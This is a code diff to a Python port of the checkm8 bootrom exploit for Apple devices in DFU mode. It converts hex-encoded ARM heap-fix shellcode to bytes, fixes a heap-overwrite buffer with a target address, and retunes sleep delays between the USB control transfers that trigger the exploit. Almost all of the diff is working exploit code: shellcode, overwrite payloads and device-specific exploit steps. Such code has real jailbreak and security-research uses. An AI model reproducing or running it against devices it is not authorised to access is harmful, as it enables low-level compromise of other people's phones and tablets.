@@ -306,12 +306,13 @@ def payload(cpid: int) -> bytes:
             + b"\0" * (PAYLOAD_OFFSET_ARMV7 - len(s5l8747x_shellcode))
             + s5l8747x_handler
         )
-        fix_heap = "fe402de93c409fe50050a0e338609fe5" \
-                    "016086e2050084e036ff2fe1405085e2" \
-                    "1e0d55e3faffff1a20409fe520009fe5" \
-                    "20109fe5000084e5041084e5fe40bde8" \
-                    "14009fe510ff2fe1e0b401221c360000" \
-                    "40b30122080000000200000000000022".encode('iso-8859-15')
+        fix_heap = bytes.fromhex(
+            "fe402de93c409fe50050a0e338609fe5" \
+            "016086e2050084e036ff2fe1405085e2" \
+            "1e0d55e3faffff1a20409fe520009fe5" \
+            "20109fe5000084e5041084e5fe40bde8" \
+            "14009fe510ff2fe1e0b401221c360000" \
+            "40b30122080000000200000000000022")
         assert len(ret) < 0x300
         ret += b"\0" * (0x300 - len(ret)) + fix_heap
         return ret
@@ -697,7 +698,7 @@ def all_exploit_configs() -> list[DeviceConfig]:
     t8012_nop_gadget = 0x100008DB8
     t8015_nop_gadget = 0x10000A9C4
 
-    s5l8747x_overwrite = '\0' * 0x760 + struct.pack('<20xI', 0x22000300)
+    s5l8747x_overwrite = b"\0" * 0x760 + struct.pack("<20xI", 0x22000300)
     s5l8947x_overwrite = b"\0" * 0x660 + struct.pack("<20xI4x", 0x34000000)
     s5l895xx_overwrite = b"\0" * 0x640 + struct.pack("<20xI4x", 0x10000000)
     t800x_overwrite = b"\0" * 0x5C0 + struct.pack("<20xI4x", 0x48818000)
@@ -814,7 +815,7 @@ def exploit(match: None = None) -> None:
     libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
     dfu.release_device(device)
 
-    time.sleep(0.5)
+    time.sleep(0.7)
 
     device = dfu.acquire_device(match=match)
     assert device
@@ -832,6 +833,8 @@ def exploit(match: None = None) -> None:
         )
     dfu.usb_reset(device)
     dfu.release_device(device)
+
+    time.sleep(0.3)
 
     device = dfu.acquire_device(match=match)
     assert device
@@ -909,7 +912,7 @@ def exploit_a8_a9(match=None):
 
 def exploit_a9x(match: None = None) -> None:
     print("*** checkm8 exploit by axi0mX ***")
-    
+
     device = dfu.acquire_device(match=match)
     assert device
     start = time.time()
